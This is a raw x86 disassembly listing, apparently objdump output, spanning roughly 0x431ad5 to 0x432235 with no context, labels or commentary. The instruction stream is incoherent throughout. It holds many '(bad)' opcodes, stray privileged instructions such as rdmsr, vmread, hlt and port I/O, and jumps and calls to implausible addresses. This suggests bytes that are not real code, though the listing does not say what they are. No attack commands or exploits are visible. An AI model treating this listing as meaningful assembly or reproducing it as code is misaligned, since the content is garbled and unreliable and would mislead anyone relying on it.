  431ad5:	mov    esi,0x7f33ff5f
  431ada:	inc    eax
  431adb:	test   DWORD PTR [edx],eax
  431add:	je     0x431a9f
  431adf:	mov    ecx,ecx
  431ae1:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431ae5:	and    eax,DWORD PTR [eax+0xf0103]
  431aeb:	jp     0x431ad9
  431aed:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431af1:	add    edx,DWORD PTR [edi+0x74]
  431af4:	sbb    BYTE PTR [ebp+0x4d001484],cl
  431afa:	add    BYTE PTR [ebp-0x74c48bbb],al
  431b00:	je     0x431a85
  431b02:	cmp    eax,edi
  431b04:	js     0x431b29
  431b06:	add    eax,0xeb0fc003
  431b0b:	jns    0x431a98
  431b0d:	vmread DWORD PTR [ecx+0x45],ebx
  431b11:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431b17:	adc    al,0x8b
  431b19:	jge    0x431b2f
  431b1b:	mov    edi,DWORD PTR [eax-0x4]
  431b1e:	add    edi,DWORD PTR [edi]
  431b20:	or     bh,bh
  431b22:	push   ebp
  431b23:	push   es
  431b24:	mov    DWORD PTR [ebp-0x4],ebx
  431b27:	add    edi,esi
  431b29:	pop    es
  431b2a:	add    esi,DWORD PTR [edi-0x48ccf183]
  431b30:	mov    DWORD PTR [esp+esi*8],ecx
  431b33:	inc    ebp
  431b34:	pop    ebp
  431b35:	xor    DWORD PTR [esi-0x4],0x3b
  431b39:	add    edx,DWORD PTR [ecx+edi*1]
  431b3c:	push   es
  431b3d:	clc    
  431b3e:	mov    bh,0xdb
  431b40:	jp     0x431af9
  431b42:	add    cl,BYTE PTR [esi]
  431b44:	div    DWORD PTR [edi+0x4d8b0c1c]
  431b4a:	test   edi,edi
  431b4c:	je     0x431b42
  431b4e:	mov    eax,ecx
  431b50:	or     BYTE PTR [ebx],al
  431b52:	dec    BYTE PTR [ecx+0x7d3bec7d]
  431b58:	jbe    0x431bcc
  431b5a:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  431b60:	add    ecx,DWORD PTR [esi]
  431b62:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  431b68:	add    eax,DWORD PTR [ebx-0x287af783]
  431b6e:	je     0x431bbd
  431b70:	mov    DWORD PTR [ecx],edi
  431b72:	mov    esi,eax
  431b74:	hlt    
  431b75:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431b7c:	jb     0x431b3e
  431b7e:	jmp    0x431b6b
  431b80:	xor    esi,DWORD PTR [ebx]
  431b82:	pop    edi
  431b83:	pop    esi
  431b84:	pop    ebx
  431b85:	ret    
  431b86:	ret    0x8b
  431b89:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431b8f:	xor    DWORD PTR [ecx],0xc
  431b92:	pushf  
  431b93:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431b99:	rdmsr  
  431b9b:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431ba2:	dec    ebp
  431ba3:	ret    
  431ba4:	mov    edi,DWORD PTR [esi-0x4]
  431ba7:	pop    eax
  431ba8:	dec    ebp
  431ba9:	jne    0x431b36
  431bab:	xor    edi,esp
  431bad:	inc    eax
  431bae:	dec    ebp
  431baf:	jbe    0x431c04
  431bb1:	inc    eax
  431bb2:	pop    ebp
  431bb3:	add    edx,DWORD PTR [esi+0x8]
  431bb6:	push   esp
  431bb7:	dec    eax
  431bb8:	push   ecx
  431bb9:	mov    eax,edi
  431bbb:	and    al,0xf0
  431bbd:	jo     0x431baa
  431bbf:	mov    eax,DWORD PTR [ebx]
  431bc1:	sbb    BYTE PTR [ebp+0x4d],cl
  431bc4:	mov    eax,DWORD PTR [ebx]
  431bc6:	nop
  431bc7:	or     BYTE PTR [eax],al
  431bc9:	jne    0x431c22
  431bcb:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431bd1:	cld    
  431bd2:	xor    edi,edi
  431bd4:	add    edi,DWORD PTR [ebp+0x3]
  431bd7:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431bdd:	js     0x431b63
  431bdf:	jae    0x431be3
  431be1:	(bad)  
  431be3:	xor    al,0x5d
  431be5:	jmp    0x431b72
  431be7:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431bee:	fdecstp 
  431bf0:	test   BYTE PTR [edi],ah
  431bf2:	add    bh,BYTE PTR [ebp+0x0]
  431bf5:	add    ebx,DWORD PTR [ebp-0x77]
  431bf8:	mov    edi,eax
  431bfa:	cmp    al,0x0
  431bfd:	adc    dh,BYTE PTR [ebx]
  431bff:	jge    0x431c04
  431c01:	mov    edi,DWORD PTR [ebx]
  431c03:	jl     0x431c14
  431c05:	clc    
  431c06:	dec    edi
  431c07:	jge    0x431c09
  431c09:	mov    eax,DWORD PTR [ebx]
  431c0b:	jb     0x431c15
  431c0d:	mov    ecx,DWORD PTR [ebp-0x8]
  431c10:	mov    edi,edi
  431c12:	xor    edx,DWORD PTR [eax]
  431c14:	add    edi,DWORD PTR [ebx]
  431c16:	mov    DWORD PTR [ebp-0x10],edi
  431c19:	inc    edi
  431c1a:	pop    ebp
  431c1b:	jge    0x431c58
  431c1d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431c21:	mov    edx,0xc05d87f0
  431c26:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431c2a:	fimul  WORD PTR [eax]
  431c2c:	fist   WORD PTR [ebp+0x1c]
  431c2f:	in     al,dx
  431c30:	jne    0x431c1e
  431c32:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431c38:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431c3c:	fdivp  st(0),st
  431c3e:	fild   WORD PTR [ebp+0x4510f85c]
  431c44:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431c4a:	inc    ebp
  431c4b:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431c51:	mov    ebp,DWORD PTR [ebx-0x4]
  431c54:	adc    al,0x8b
  431c56:	rcl    DWORD PTR [eax],0x48
  431c59:	mov    esi,0x7080803
  431c5e:	fiadd  WORD PTR [ebp+0x4d]
  431c61:	(bad)  
  431c62:	mov    edx,DWORD PTR [edx-0x4]
  431c65:	mov    edx,DWORD PTR [ebp-0x4]
  431c68:	xor    ebx,DWORD PTR [ebx+0x330103]
  431c6e:	mov    DWORD PTR [edi+0x872dc],edi
  431c74:	xlat   BYTE PTR ds:[ebx]
  431c75:	into   
  431c76:	ffreep st(6)
  431c78:	retf   0x6c7
  431c7b:	iret   
  431c7c:	dec    ebp
  431c7d:	inc    ebp
  431c7e:	mov    DWORD PTR [ebx],edi
  431c80:	fmul   QWORD PTR [edi]
  431c82:	dec    ebp
  431c83:	jnp    0x431cb8
  431c85:	add    BYTE PTR [ebx],al
  431c87:	mov    ecx,DWORD PTR [esp+edi*8]
  431c8a:	inc    ebp
  431c8b:	dec    ebp
  431c8c:	lea    esi,[ebx]
  431c8e:	add    DWORD PTR [ebx],eax
  431c90:	jb     0x431ccd
  431c92:	add    BYTE PTR [edi],cl
  431c94:	inc    ebp
  431c95:	imul   eax,edi,0x858bd800
  431c9b:	cld    
  431c9c:	clc    
  431c9d:	mov    DWORD PTR [ebp+0x0],eax
  431ca0:	inc    DWORD PTR [eax]
  431ca2:	or     al,0xde
  431ca4:	sbb    bh,0x1
  431ca7:	retf   
  431ca8:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431caf:	dec    ebp
  431cb0:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431cb6:	enter  0x12de,0xdf
  431cba:	inc    ebp
  431cbb:	pop    ebp
  431cbc:	dec    DWORD PTR [ebx-0x257f0ff4]
  431cc2:	add    DWORD PTR [edx],edx
  431cc4:	add    BYTE PTR [ebp+0x50],dl
  431cc7:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431ccd:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431cd3:	or     ah,al
  431cd5:	pop    ss
  431cd6:	cdq    
  431cd7:	push   ebp
  431cd8:	clc    
  431cd9:	mov    eax,DWORD PTR [ebp-0x4]
  431cdc:	xor    edx,edx
  431cde:	add    esi,DWORD PTR [ebx]
  431ce0:	cmp    eax,DWORD PTR [ebx]
  431ce2:	hlt    
  431ce3:	cmp    DWORD PTR [ebx],esp
  431ce5:	or     al,BYTE PTR [ebp+0xf]
  431ce8:	mov    eax,DWORD PTR [edx]
  431cea:	loopne 0x431cec
  431cec:	(bad)  
  431ced:	mov    ecx,esi
  431cef:	cld    
  431cf0:	pushf  
  431cf1:	pop    ebp
  431cf2:	fwait
  431cf3:	mov    esi,DWORD PTR [edx]
  431cf5:	lock mov eax,eax
  431cf8:	adc    BYTE PTR [ebx],al
  431cfa:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431d01:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431d07:	dec    ebp
  431d08:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431d0e:	(bad)  
  431d0f:	iret   
  431d10:	inc    ebp
  431d11:	(bad)  
  431d12:	jne    0x431d61
  431d14:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431d1a:	(bad)  
  431d1b:	cmp    ebx,eax
  431d1d:	je     0x431ca5
  431d1f:	add    edi,edi
  431d21:	or     bh,bh
  431d23:	dec    ebp
  431d24:	inc    ebp
  431d25:	mov    esi,DWORD PTR [ebx]
  431d27:	cld    
  431d28:	add    ecx,esi
  431d2a:	cmp    ecx,DWORD PTR [eax-0xc]
  431d2d:	mov    edx,DWORD PTR [edi]
  431d2f:	or     BYTE PTR [ebp-0x7c],al
  431d32:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431d38:	test   BYTE PTR [ebx+ebx*4],cl
  431d3b:	inc    ebp
  431d3c:	xor    bh,BYTE PTR [esi]
  431d3e:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431d45:	jne    0x431d0e
  431d47:	mov    ebp,esp
  431d49:	fcomp  DWORD PTR [ebx]
  431d4b:	add    BYTE PTR [ecx],al
  431d4d:	inc    DWORD PTR [ebp-0x75]
  431d50:	(bad)  
  431d51:	cld    
  431d52:	add    al,0xce
  431d54:	mov    ecx,edi
  431d56:	cld    
  431d57:	inc    ebp
  431d58:	fidivr WORD PTR [ebx]
  431d5a:	fbstp  TBYTE PTR [ebp-0x3e]
  431d5d:	mov    eax,DWORD PTR [eax]
  431d5f:	adc    BYTE PTR [ebx-0x3974038b],cl
  431d65:	fadd   st,st(7)
  431d67:	add    BYTE PTR [ebp-0x1],al
  431d6a:	mov    ecx,DWORD PTR [esp+edi*8]
  431d6d:	inc    ebp
  431d6e:	mov    bh,0xc7
  431d71:	loopne 0x431db8
  431d73:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431d79:	sbb    dh,BYTE PTR [ebx]
  431d7b:	pushf  
  431d7c:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431d82:	mov    eax,edi
  431d84:	cwde   
  431d85:	inc    ebp
  431d86:	inc    ebp
  431d87:	jne    0x431d14
  431d89:	mov    esp,esp
  431d8b:	clc    
  431d8c:	add    al,0x4d
  431d8e:	mov    DWORD PTR [ebx],esi
  431d90:	or     al,0x33
  431d92:	inc    ebp
  431d93:	lea    ecx,[ebx-0x398d13fd]
  431d99:	add    bh,al
  431d9b:	inc    ebp
  431d9c:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431da3:	add    ebp,esp
  431da5:	shufps xmm1,xmm3,0xc7
  431da9:	(bad)  
  431daa:	jmp    0x748858d3
  431daf:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431db5:	hlt    
  431db6:	mov    ecx,DWORD PTR [edi]
  431db8:	fadd   DWORD PTR [ebp+0x0]
  431dbb:	xor    ecx,DWORD PTR [edi]
  431dbd:	add    ecx,ecx
  431dbf:	cmp    edi,edi
  431dc1:	pmuludq mm7,QWORD PTR [edx+0x50]
  431dc5:	(bad)  
  431dc6:	jmp    0x431d53
  431dc8:	mov    edi,esp
  431dca:	or     al,0xc6
  431dcc:	inc    ebp
  431dcd:	(bad)  
  431dce:	mov    eax,DWORD PTR [ebp+0x10]
  431dd1:	jne    0x431d5c
  431dd3:	mov    eax,DWORD PTR [ecx]
  431dd5:	clc    
  431dd6:	add    BYTE PTR [ebp-0x40],cl
  431dd9:	xor    edx,DWORD PTR [eax-0x73]
  431ddc:	jne    0x431ddf
  431dde:	push   DWORD PTR [edx+0x8]
  431de1:	add    BYTE PTR [ebp+0x45],al
  431de4:	mov    ebp,ecx
  431de6:	cld    
  431de7:	add    BYTE PTR [ebp+0x0],cl
  431dea:	xor    eax,DWORD PTR [ebp+0x3]
  431ded:	mov    DWORD PTR [ebx],edi
  431def:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431df5:	sub    eax,0x5d330e4d
  431dfa:	lea    esi,[ebx]
  431dfc:	add    DWORD PTR [ebx],eax
  431dfe:	jb     0x431de9
  431e00:	add    BYTE PTR [eax],al
  431e02:	inc    ebp
  431e03:	add    bl,ch
  431e05:	inc    ebp
  431e06:	mov    esi,DWORD PTR [ebx]
  431e08:	or     al,0x3
  431e0a:	(bad)  
  431e0b:	mov    edi,eax
  431e0d:	in     al,dx
  431e0e:	scas   eax,DWORD PTR es:[edi]
  431e0f:	inc    ebp
  431e10:	mov    esi,DWORD PTR [ebx]
  431e12:	in     al,0x3
  431e14:	add    al,0x89
  431e16:	mov    ecx,DWORD PTR [eax+edi*8]
  431e19:	dec    ebp
  431e1a:	(bad)  
  431e1b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431e22:	mov    ecx,eax
  431e24:	cld    
  431e25:	push   es
  431e26:	dec    ebp
  431e27:	add    al,0x33
  431e29:	mov    DWORD PTR [ebx],eax
  431e2b:	in     al,dx
  431e2c:	cmp    DWORD PTR [ebp-0x67],eax
  431e2f:	mov    eax,DWORD PTR [ebp-0xba0068]
  431e35:	mov    edx,DWORD PTR [ebp-0x4]
  431e38:	mov    ecx,DWORD PTR [ebp-0x2c]
  431e3b:	xor    eax,DWORD PTR [ebp+0x3]
  431e3e:	cmp    DWORD PTR [ebx],0x8b32749a
  431e44:	xor    edi,esp
  431e46:	jmp    0xff771b98
  431e4b:	add    ecx,DWORD PTR [ebp-0x3f]
  431e4e:	xor    ebx,DWORD PTR [edi]
  431e50:	add    eax,ecx
  431e52:	cmp    ebx,DWORD PTR [eax]
  431e54:	mov    ecx,DWORD PTR [ebp-0x4]
  431e57:	mov    ecx,DWORD PTR [eax]
  431e59:	adc    BYTE PTR [ebp-0x80],al
  431e5c:	jmp    0x431e5f
  431e5e:	mov    eax,DWORD PTR [eax]
  431e60:	cld    
  431e61:	mov    bh,0xc6
  431e63:	push   ecx
  431e64:	(bad)  
  431e65:	jne    0x431ec5
  431e67:	dec    ecx
  431e69:	or     BYTE PTR [ecx+ebx*1],cl
  431e6c:	push   ebp
  431e6d:	inc    ebp
  431e6e:	in     al,dx
  431e6f:	add    ebp,esp
  431e71:	or     bh,al
  431e73:	dec    ebp
  431e74:	cld    
  431e75:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431e7b:	xor    DWORD PTR [edx],0x2
  431e7e:	pushf  
  431e7f:	dec    DWORD PTR [ebx+0x45510cf4]
  431e85:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431e8b:	mov    edx,DWORD PTR [ecx+0xc]
  431e8e:	xor    eax,esi
  431e90:	mov    edx,0xc172c7
  431e95:	inc    ebp
  431e96:	mov    esi,DWORD PTR [ebp+0x8]
  431e99:	mov    eax,edx
  431e9b:	call   0x84c7e590
  431ea0:	add    DWORD PTR [ebx-0x76bace00],ebx
  431ea6:	mov    ebp,eax
  431ea8:	or     BYTE PTR [eax],dl
  431eaa:	jo     0x431ef9
  431eac:	push   edi
  431ead:	xor    esi,DWORD PTR [ebp+0x3]
  431eb0:	(bad)  
  431eb1:	pmulhuw mm0,mm1
  431eb4:	test   DWORD PTR [ebp-0x8],ecx
  431eb7:	mov    DWORD PTR [ebp-0x67],eax
  431eba:	mov    eax,DWORD PTR [ebp-0x4]
  431ebd:	xor    edi,DWORD PTR [ebp-0x73]
  431ec0:	xor    eax,DWORD PTR [ebx]
  431ec2:	xor    esi,DWORD PTR [edx+0x3]
  431ec5:	add    BYTE PTR [ecx],bh
  431ec7:	inc    ebp
  431ec8:	(bad)  
  431ec9:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431ecf:	mov    DWORD PTR [eax],0x750f0004
  431ed5:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431edb:	lock add BYTE PTR [ebp+0x0],cl
  431edf:	mov    esi,DWORD PTR [ebp-0x18]
  431ee2:	mov    ebp,edx
  431ee4:	or     al,0x72
  431ee6:	ja     0x431ee8
  431ee8:	mov    edx,esi
  431eea:	cld    
  431eeb:	(bad)  
  431eee:	cli    
  431eef:	mov    esi,DWORD PTR [ebp-0x4]
  431ef2:	cmp    ecx,esi
  431ef4:	bswap  edi
  431ef6:	(bad)
  431efa:	mov    esi,DWORD PTR [ebp-0x4]
  431efd:	mov    esi,ecx
  431eff:	clc    
  431f00:	repnz add esi,DWORD PTR [ebp+0x45]
  431f04:	push   ebx
  431f05:	xor    eax,DWORD PTR [ebp+0x3]
  431f08:	cmp    al,0x5f
  431f0a:	pushf  
  431f0b:	pop    ebx
  431f0c:	jmp    0x431fd3
  431f11:	mov    esi,DWORD PTR [ebp-0x7d]
  431f14:	xor    ebp,DWORD PTR [eax]
  431f16:	lea    eax,[ebp-0x8]
  431f19:	xor    edx,esi
  431f1b:	pushf  
  431f1c:	out    dx,eax
  431f1d:	(bad)  
  431f1e:	neg    eax
  431f20:	ins    DWORD PTR es:[edi],dx
  431f21:	test   esi,edi
  431f23:	clc    
  431f24:	pop    esp
  431f25:	inc    ebp
  431f26:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431f2c:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431f32:	add    cl,al
  431f34:	jne    0x431ed1
  431f36:	mov    esi,DWORD PTR [edx]
  431f38:	in     al,dx
  431f39:	push   esi
  431f3a:	xor    BYTE PTR [ebp-0xe],dh
  431f3d:	add    edi,esi
  431f3f:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431f45:	add    cl,bh
  431f47:	mov    edi,DWORD PTR [ebp+0x8]
  431f4a:	mov    DWORD PTR [ebp-0x14],esi
  431f4d:	add    esi,DWORD PTR [ebp+0x3c]
  431f50:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431f56:	mov    ah,0x3e
  431f58:	fwait
  431f59:	pushf  
  431f5a:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431f60:	jne    0x431eed
  431f62:	mov    ecx,DWORD PTR [esp+ebp*8]
  431f65:	icebp  
  431f66:	icebp  
  431f67:	shl    edx,0xf2
  431f6a:	(bad)  
  431f6b:	mov    ah,0x16
  431f6d:	push   eax
  431f6e:	jne    0x431f03
  431f70:	mov    ecx,DWORD PTR [edi]
  431f72:	in     al,dx
  431f73:	jmp    0x431f66
  431f75:	add    dl,dh
  431f77:	mov    edi,esi
  431f79:	or     al,0x8
  431f7b:	inc    ebp
  431f7c:	jne    0x431f81
  431f7e:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431f84:	ret    
  431f85:	or     bh,bh
  431f87:	jge    0x431f71
  431f89:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431f8f:	xor    edi,eax
  431f91:	add    esi,DWORD PTR [ebp-0x77]
  431f94:	mov    ebx,esp
  431f96:	clc    
  431f97:	neg    DWORD PTR [ebp-0x7c]
  431f9a:	xor    eax,DWORD PTR [eax]
  431f9c:	cmp    eax,DWORD PTR [eax]
  431f9e:	repz jne 0x431f36
  431fa1:	xor    eax,DWORD PTR [ecx]
  431fa3:	add    ebx,DWORD PTR [eax]
  431fa5:	mov    DWORD PTR [ebp-0x8],eax
  431fa8:	mov    eax,edi
  431faa:	cld    
  431fab:	lock pop eax
  431fad:	test   DWORD PTR [ebx],esi
  431faf:	clc    
  431fb0:	add    edx,DWORD PTR [edi-0x740bff77]
  431fb6:	fdivp  st(4),st
  431fb8:	test   ecx,esi
  431fba:	(bad)  
  431fbb:	jnp    0x431fbc
  431fbd:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431fc3:	jae    0x431f50
  431fc5:	sub    edi,esp
  431fc7:	(bad)  
  431fc8:	shl    DWORD PTR [eax-0x3e],0x89
  431fcc:	leave  
  431fcd:	call   0x8198d6da
  431fd2:	in     al,dx
  431fd3:	(bad)  
  431fd4:	in     al,dx
  431fd5:	add    bh,al
  431fd7:	mov    esp,edi
  431fd9:	in     al,dx
  431fda:	test   DWORD PTR [ebp-0x8],edi
  431fdd:	mov    eax,DWORD PTR [ebp+0x2b]
  431fe0:	xor    al,BYTE PTR [ebx]
  431fe2:	pushf  
  431fe3:	jnp    0x57321c1c
  431fe9:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431fed:	loopne 0x432022
  431fef:	jne    0x431fac
  431ff1:	mov    esi,DWORD PTR [edx-0x20]
  431ff4:	add    BYTE PTR [ebp-0x3d],bh
  431ff7:	xor    eax,DWORD PTR [ebp-0x73]
  431ffa:	mov    edi,DWORD PTR [esi]
  431ffc:	cld    
  431ffd:	jb     0x431fc5
  431fff:	add    bl,al
  432001:	jne    0x432048
  432003:	mov    edx,DWORD PTR [edi-0x10]
  432006:	jge    0x432085
  432008:	mov    esi,DWORD PTR [ebx]
  43200a:	lock add ecx,DWORD PTR [ebp+0x3b]
  43200e:	xor    esi,DWORD PTR [ebp-0x77]
  432011:	mov    esi,eax
  432013:	lock inc ebp
  432015:	jge    0x432048
  432017:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  43201e:	dec    ebp
  43201f:	mov    esi,DWORD PTR [ebx]
  432021:	loopne 0x431fac
  432023:	jge    0x43201d
  432025:	add    DWORD PTR [ebp-0x7d],eax
  432028:	icebp  
  432029:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  432030:	dec    ebp
  432031:	hlt    
  432032:	xor    ebx,DWORD PTR [ebp-0x77]
  432035:	mov    esi,esp
  432037:	in     al,0x45
  432039:	jge    0x432078
  43203b:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  432042:	dec    ebp
  432043:	push   esp
  432044:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  43204a:	inc    ebp
  43204b:	hlt    
  43204c:	xor    DWORD PTR [ebp-0x61],esi
  43204f:	mov    edi,DWORD PTR [eax+0xf19504]
  432055:	repnz mov DWORD PTR [ebp+0x20],ebx
  432059:	cmp    eax,DWORD PTR [ebp+0xf]
  43205c:	test   DWORD PTR [edi+ecx*1-0x1],edx
  432060:	fistp  WORD PTR [ebx+0x0]
  432063:	inc    ebp
  432064:	mov    ebx,DWORD PTR [edi+0xc]
  432067:	add    eax,eax
  432069:	inc    ebp
  43206a:	test   BYTE PTR [ebx],dh
  43206c:	add    eax,DWORD PTR [ebx]
  43206e:	add    BYTE PTR [esi+0x45],bl
  432071:	ret    0x85
  432074:	jnp    0x5443a443
  43207a:	inc    bp
  43207c:	inc    ebp
  43207d:	xor    DWORD PTR [ecx+0xc78a9c],edi
  432083:	fdiv   QWORD PTR [ebx]
  432085:	test   DWORD PTR [ecx+0x453bf8],edi
  43208b:	push   ebx
  43208c:	add    edi,DWORD PTR [esi+0x708088b]
  432092:	cmp    esi,eax
  432094:	setnp  BYTE PTR [ecx-0x74fcffce]
  43209b:	mov    esp,edi
  43209d:	call   0x33ce65ef
  4320a2:	or     BYTE PTR [ebx],al
  4320a4:	inc    ecx
  4320a5:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  4320ab:	and    BYTE PTR [ebp-0x7074f0bb],al
  4320b1:	lock add cl,al
  4320b4:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  4320bb:	mov    ch,0x45
  4320bd:	clc    
  4320be:	xor    eax,DWORD PTR [ebp+0x3]
  4320c1:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4320c7:	inc    ebp
  4320c8:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4320ce:	mov    edi,eax
  4320d0:	mov    eax,DWORD PTR [ebp+0x3c]
  4320d3:	mov    ecx,DWORD PTR [eax]
  4320d5:	hlt    
  4320d6:	inc    ebp
  4320d7:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4320de:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4320e4:	push   ebp
  4320e5:	mov    edi,DWORD PTR [ebx]
  4320e7:	in     al,dx
  4320e8:	jne    0x4320ab
  4320ea:	mov    eax,DWORD PTR [ebp-0x28]
  4320ed:	add    DWORD PTR [eax],0xe8058dec
  4320f3:	clc    
  4320f4:	mov    esi,DWORD PTR [edi-0x8]
  4320f7:	add    dh,dl
  4320f9:	rol    WORD PTR [ebp-0x1],cl
  4320fd:	mov    edx,DWORD PTR [eax+0x8]
  432100:	jne    0x4320c2
  432102:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  432109:	inc    ebp
  43210a:	push   esp
  43210b:	test   DWORD PTR [ecx+0xf],ecx
  43210e:	sub    edx,esp
  432110:	add    eax,DWORD PTR [eax]
  432112:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  432118:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  43211f:	mov    eax,DWORD PTR [ecx]
  432121:	and    BYTE PTR [eax],al
  432123:	cmp    al,0x10
  432125:	add    BYTE PTR [ebp+0x66],al
  432128:	inc    ecx
  43212a:	push   esp
  43212b:	add    dh,BYTE PTR [ebp+0x0]
  43212e:	push   edx
  43212f:	enterw 0xc1,0x4d
  432134:	mov    esp,DWORD PTR [esi+0x20]
  432137:	add    DWORD PTR [ecx-0x7b],eax
  43213a:	add    eax,DWORD PTR [ebx]
  43213c:	str    WORD PTR [eax+0x45]
  432140:	lea    ecx,[ebx+0x45890801]
  432146:	sbb    BYTE PTR [ebx],al
  432148:	dec    ebp
  432149:	cmp    al,0xf
  43214b:	inc    ebp
  43214c:	push   eax
  43214d:	mov    esi,DWORD PTR [ebx]
  43214f:	push   eax
  432150:	add    eax,eax
  432152:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  432159:	inc    ebp
  43215a:	add    BYTE PTR [ecx],dh
  43215c:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  432163:	(bad)  
  432164:	mov    ebx,eax
  432166:	loopne 0x4321ad
  432168:	dec    ebp
  432169:	mov    ecx,DWORD PTR [edi]
  43216b:	cld    
  43216c:	push   eax
  43216d:	xchg   DWORD PTR [ebx],esi
  43216f:	add    DWORD PTR [ebx],ebp
  432171:	add    BYTE PTR [ebx],ch
  432173:	or     BYTE PTR [ecx],bh
  432175:	dec    ecx
  432176:	loopne 0x43217b
  432178:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  43217e:	push   ebp
  43217f:	add    DWORD PTR [ebx+0x55100800],eax
  432185:	dec    ebp
  432186:	jmp    0x432111
  432188:	mov    esp,DWORD PTR [eax]
  43218a:	sbb    dl,dl
  43218c:	inc    eax
  43218d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432193:	add    BYTE PTR [ebx+0x74528555],cl
  432199:	push   ebp
  43219a:	div    DWORD PTR [ebx]
  43219c:	and    eax,DWORD PTR [ebx]
  43219e:	add    edx,DWORD PTR [edx-0x30]
  4321a1:	jno    0x43212e
  4321a3:	inc    DWORD PTR [eax+eiz*1]
  4321a6:	inc    ebp
  4321a7:	push   eax
  4321a8:	push   eax
  4321a9:	mov    esp,DWORD PTR [edi-0x74beff1c]
  4321af:	mov    edi,esp
  4321b1:	push   eax
  4321b2:	inc    ebp
  4321b3:	enter  0x458b,0x8
  4321b7:	push   ecx
  4321b8:	(bad)  
  4321b9:	call   0x10d2b91
  4321be:	pop    ss
  4321bf:	push   ebp
  4321c0:	mov    ecx,DWORD PTR [ebx+0x489408]
  4321c6:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4321cc:	push   ecx
  4321cd:	jo     0x4321b7
  4321cf:	inc    DWORD PTR [edi]
  4321d1:	or     BYTE PTR [eax],al
  4321d3:	call   0xce291d
  4321d8:	fmul   QWORD PTR [ebp+0x55]
  4321db:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4321e1:	mov    bh,0x8c
  4321e3:	adc    al,0x9b
  4321e5:	dec    esp
  4321e6:	xor    bl,BYTE PTR [eax]
  4321e8:	mov    ecx,DWORD PTR [ebp+0xc]
  4321eb:	mov    eax,DWORD PTR [ebp-0x4]
  4321ee:	mov    esi,DWORD PTR [edi-0x3148f924]
  4321f4:	push   es
  4321f5:	retf   
  4321f6:	mov    BYTE PTR [ebp-0x30],0x3b
  4321fa:	inc    ebp
  4321fb:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432202:	retf   0x83fc
  432205:	into   
  432206:	dec    ebp
  432207:	retf   
  432208:	mov    ecx,DWORD PTR [ebp-0x74]
  43220b:	mov    eax,DWORD PTR [eax]
  43220d:	fdiv   QWORD PTR [ebx]
  43220f:	mov    bh,0x3
  432211:	push   es
  432212:	mov    esi,ecx
  432214:	sbb    cl,dl
  432216:	dec    ebp
  432217:	sar    DWORD PTR [ebx],cl
  432219:	push   ebp
  43221a:	jne    0x43222b
  43221c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  432222:	lea    ebx,[eax]
  432224:	call   0xf4ccadeb
  432229:	sbb    dh,dl
  43222b:	add    edx,ebx
  43222d:	push   ebp
  43222e:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  432234:	push   ecx
  432235:	mov    DWORD PTR [eax-0x30],edx
